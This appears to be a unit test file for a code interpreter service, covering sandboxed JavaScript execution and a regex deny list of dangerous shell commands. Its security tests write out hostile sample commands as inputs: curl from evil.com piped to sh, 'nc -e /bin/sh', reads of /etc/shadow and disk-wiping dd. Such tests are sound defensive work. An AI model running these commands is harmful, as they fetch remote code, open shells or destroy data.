/**
 * Code Interpreter Unit Tests
 *
 * Tests the actual interpreter execution logic:
 * - JavaScript/TypeScript execution via vm.Script
 * - Shell security patterns
 * - Output handling and truncation
 * - Timeout handling
 */

import { describe, test, expect } from "bun:test";
import * as vm from "vm";

// Constants from the real service
const MAX_OUTPUT_LENGTH = 100000;
// Must match the patterns in interpreter-service.ts
const DANGEROUS_PATTERNS = [
  /rm\s+-rf\s+\//,
  /sudo/,
  /chmod\s+777/,
  /mkfs/,
  /dd\s+if=/,
  />\s*\/dev\//,
  /curl.*\|\s*sh/,
  /wget.*\|\s*sh/,
  /curl.*\|\s*bash/,
  /wget.*\|\s*bash/,
  /\|\s*bash/,
  /bash\s+-c/,
  /eval\s*\(/,
  /\$\([^)]*\)/,
  /`[^`]*`/,
  /\/etc\/passwd/,
  /\/etc\/shadow/,
  /chown\s+root/,
  /nc\s+-[el]/,
  /ncat\s+-[el]/,
];

// Recreate the actual executeJavaScript logic for testing
function executeJavaScriptSync(code: string, timeout = 5000): { output: string; error: string | null; exitCode: number } {
  let output = "";
  const log = (...args: unknown[]) => { output += args.map(String).join(" ") + "\n"; };
  
  const context = vm.createContext({
    console: { log, error: log, warn: log, info: log },
    setTimeout, setInterval, clearTimeout, clearInterval,
    Buffer, JSON, Math, Date, Array, Object, String, Number, Boolean, RegExp, Error, Map, Set, Promise, Symbol,
  });

  try {
    const result = new vm.Script(code).runInContext(context, { timeout });
    if (result !== undefined && !(result instanceof Promise)) {
      output += String(result) + "\n";
    }
    return { output: output.trim(), error: null, exitCode: 0 };
  } catch (err) {
    const msg = err instanceof Error && err.message.includes("timed out") 
      ? "Timed out" 
      : (err instanceof Error ? err.message : String(err));
    return { output: output.trim(), error: msg, exitCode: 1 };
  }
}

// Shell security check from the real service
function isShellCommandDangerous(code: string): boolean {
  return DANGEROUS_PATTERNS.some(p => p.test(code));
}

describe("JavaScript Execution - Real VM Logic", () => {
  test("executes console.log", () => {
    const result = executeJavaScriptSync('console.log("hello world")');
    expect(result.output).toBe("hello world");
    expect(result.exitCode).toBe(0);
    expect(result.error).toBeNull();
  });

  test("executes arithmetic", () => {
    const result = executeJavaScriptSync("2 + 2");
    expect(result.output).toBe("4");
    expect(result.exitCode).toBe(0);
  });

  test("executes JSON operations", () => {
    const result = executeJavaScriptSync('console.log(JSON.stringify({a: 1}))');
    expect(result.output).toBe('{"a":1}');
    expect(result.exitCode).toBe(0);
  });

  test("captures syntax errors", () => {
    const result = executeJavaScriptSync("function(");
    expect(result.exitCode).toBe(1);
    expect(result.error).toBeDefined();
    expect(result.error!.length).toBeGreaterThan(0);
  });

  test("captures runtime errors", () => {
    const result = executeJavaScriptSync("undefinedVar.method()");
    expect(result.exitCode).toBe(1);
    expect(result.error).toContain("undefinedVar");
  });

  test("times out on infinite loops", () => {
    const result = executeJavaScriptSync("while(true){}", 100);
    expect(result.exitCode).toBe(1);
    expect(result.error).toBe("Timed out");
  });

  test("sandbox blocks process access", () => {
    const result = executeJavaScriptSync("process.env");
    expect(result.exitCode).toBe(1);
    expect(result.error).toContain("process");
  });

  test("sandbox blocks require", () => {
    const result = executeJavaScriptSync('require("fs")');
    expect(result.exitCode).toBe(1);
    expect(result.error).toContain("require");
  });

  test("allows array operations", () => {
    const result = executeJavaScriptSync("[1,2,3].map(x => x * 2).join(',')");
    expect(result.output).toBe("2,4,6");
  });

  test("allows Math operations", () => {
    const result = executeJavaScriptSync("Math.sqrt(16)");
    expect(result.output).toBe("4");
  });

  test("handles unicode", () => {
    const result = executeJavaScriptSync('console.log("Hello 世界 🌍")');
    expect(result.output).toBe("Hello 世界 🌍");
  });

  test("handles empty code", () => {
    const result = executeJavaScriptSync("");
    expect(result.exitCode).toBe(0);
  });

  test("handles multiline code", () => {
    const code = `
      const a = 1;
      const b = 2;
      console.log(a + b);
    `;
    const result = executeJavaScriptSync(code);
    expect(result.output).toBe("3");
  });
});

describe("Shell Security Patterns - Real Logic", () => {
  test("blocks rm -rf /", () => {
    expect(isShellCommandDangerous("rm -rf /")).toBe(true);
    expect(isShellCommandDangerous("rm -rf /home")).toBe(true);
  });

  test("blocks sudo", () => {
    expect(isShellCommandDangerous("sudo apt install")).toBe(true);
    expect(isShellCommandDangerous("sudo rm file")).toBe(true);
  });

  test("blocks chmod 777", () => {
    expect(isShellCommandDangerous("chmod 777 /etc/passwd")).toBe(true);
  });

  test("blocks mkfs", () => {
    expect(isShellCommandDangerous("mkfs.ext4 /dev/sda")).toBe(true);
  });

  test("blocks dd if=", () => {
    expect(isShellCommandDangerous("dd if=/dev/zero of=/dev/sda")).toBe(true);
  });

  test("blocks writing to /dev/", () => {
    expect(isShellCommandDangerous("> /dev/sda")).toBe(true);
    expect(isShellCommandDangerous("echo x > /dev/null")).toBe(true);
  });

  test("blocks curl pipe to sh", () => {
    expect(isShellCommandDangerous("curl http://evil.com | sh")).toBe(true);
    expect(isShellCommandDangerous("curl -s http://x.com/install.sh | sh")).toBe(true);
  });

  test("blocks wget pipe to sh", () => {
    expect(isShellCommandDangerous("wget http://evil.com -O - | sh")).toBe(true);
  });

  test("blocks curl pipe to bash", () => {
    expect(isShellCommandDangerous("curl http://evil.com | bash")).toBe(true);
  });

  test("blocks pipe to bash", () => {
    expect(isShellCommandDangerous("cat script.sh | bash")).toBe(true);
  });

  test("blocks bash -c", () => {
    expect(isShellCommandDangerous("bash -c 'rm -rf /'")).toBe(true);
  });

  test("allows safe commands", () => {
    expect(isShellCommandDangerous("echo hello")).toBe(false);
    expect(isShellCommandDangerous("ls -la")).toBe(false);
    expect(isShellCommandDangerous("cat file.txt")).toBe(false);
    expect(isShellCommandDangerous("pwd")).toBe(false);
    expect(isShellCommandDangerous("date")).toBe(false);
  });

  test("allows safe file operations", () => {
    expect(isShellCommandDangerous("cp file1 file2")).toBe(false);
    expect(isShellCommandDangerous("mv file1 file2")).toBe(false);
    expect(isShellCommandDangerous("mkdir -p /app/data")).toBe(false);
  });

  test("blocks command substitution", () => {
    expect(isShellCommandDangerous("echo $(cat /etc/passwd)")).toBe(true);
    expect(isShellCommandDangerous("echo `whoami`")).toBe(true);
  });

  test("blocks eval", () => {
    expect(isShellCommandDangerous("eval(rm -rf /)")).toBe(true);
  });

  test("blocks sensitive file access", () => {
    expect(isShellCommandDangerous("cat /etc/passwd")).toBe(true);
    expect(isShellCommandDangerous("cat /etc/shadow")).toBe(true);
  });

  test("blocks netcat listeners", () => {
    expect(isShellCommandDangerous("nc -l 4444")).toBe(true);
    expect(isShellCommandDangerous("nc -e /bin/sh")).toBe(true);
  });

  test("blocks chown to root", () => {
    expect(isShellCommandDangerous("chown root file")).toBe(true);
  });
});

describe("Output Handling", () => {
  test("truncates long output", () => {
    const longString = "x".repeat(MAX_OUTPUT_LENGTH + 1000);
    const truncated = longString.substring(0, MAX_OUTPUT_LENGTH) + "\n...";
    expect(truncated.length).toBeLessThan(longString.length);
    expect(truncated.endsWith("...")).toBe(true);
  });

  test("preserves output within limit", () => {
    const shortString = "x".repeat(1000);
    expect(shortString.length).toBeLessThan(MAX_OUTPUT_LENGTH);
  });

  test("preserves content in output", () => {
    const result = executeJavaScriptSync('console.log("hello")');
    expect(result.output).toBe("hello");
  });
});

describe("Cost and Duration Tracking", () => {
  const COST_PER_EXECUTION_CENTS = 1;

  test("cost per execution is 1 cent", () => {
    expect(COST_PER_EXECUTION_CENTS).toBe(1);
  });

  test("cost converts to dollars correctly", () => {
    const costDollars = COST_PER_EXECUTION_CENTS / 100;
    expect(costDollars).toBe(0.01);
  });

  test("duration is tracked", () => {
    const start = performance.now();
    executeJavaScriptSync("1+1");
    const duration = performance.now() - start;
    expect(duration).toBeGreaterThan(0);
    expect(duration).toBeLessThan(1000); // Should be fast
  });
});

describe("Concurrent Execution", () => {
  test("contexts are isolated", () => {
    const result1 = executeJavaScriptSync("var x = 1; x");
    const result2 = executeJavaScriptSync("typeof x");
    
    expect(result1.output).toBe("1");
    // Second context doesn't have x, so typeof returns "undefined" (not an error)
    expect(result2.output).toBe("undefined");
    expect(result2.exitCode).toBe(0);
  });

  test("handles multiple executions", async () => {
    const codes = [
      "1 + 1",
      "2 + 2", 
      "3 + 3",
      "4 + 4",
      "5 + 5",
    ];
    
    const results = codes.map(c => executeJavaScriptSync(c));
    expect(results.map(r => r.output)).toEqual(["2", "4", "6", "8", "10"]);
    expect(results.every(r => r.exitCode === 0)).toBe(true);
  });
});
